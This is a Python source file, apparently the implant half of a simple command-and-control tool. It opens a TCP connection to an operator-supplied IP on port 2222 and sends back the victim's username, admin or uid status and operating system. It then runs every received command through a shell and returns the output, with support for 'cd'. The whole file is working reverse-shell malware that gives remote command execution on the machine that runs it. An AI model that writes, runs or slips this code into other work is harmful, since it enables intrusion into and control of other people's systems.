import socket
import time
import subprocess
import os
import sys
import ctypes
if os.name == 'nt':
    class Pwd():
        def getpwnam(self, user):
            pass
    pwd = Pwd()
else:
    import pwd
import platform


def inbound_message():
    print('[+] Listening for incoming messages...')
    while True:
        # message = ''
        try:
            message = sock.recv(1024).decode()
            return message
        except KeyboardInterrupt:
            sock.close()
            print('[+] Keyboard interrupt issued')
            break
        except Exception as e:
            print(e)
            sock.close()
            break


def outbound_message(message):
    response = str(message).encode()
    sock.send(response)
    # print('Message = ', message)
    print('[+] Reply sent...')


def session_handler():
    print(f'[+] Connecting to {host_ip}')
    sock.connect((host_ip, host_port))
    if platform.system() == 'Windows':
        outbound_message(os.getlogin())
        time.sleep(0.2)
        outbound_message(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(0.2)
        outbound_message(platform.system())
    else:
        outbound_message(pwd.getpwuid(os.getuid())[0])
        time.sleep(0.2)
        outbound_message(os.getuid())
        time.sleep(0.2)
        outbound_message(platform.system())

    print(f'[+] Connected to {host_ip}')
    while True:
        message = inbound_message()
        print(f'[+] Message received - {message}')
        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break
        elif not message:
            sock.close()
            break
        # Change directory script
        elif message.split(" ")[0] == 'cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                outbound_message(cur_dir)
            except FileNotFoundError:
                outbound_message('Invalid directory. Try again.')
                continue
            except IndexError:
                outbound_message('Argument missing. Try again.')

        # Subprocess command handling
        else:
            command = subprocess.Popen(
                message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            return_code = command.wait()
            if not output and return_code == 0:
                output = '[*] Success'
                outbound_message(output)
            else:
                outbound_message(output.decode())


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host_ip = "INPUT_IP_HERE"
    host_port = 2222  # INPUT_PORT_HERE
    session_handler()
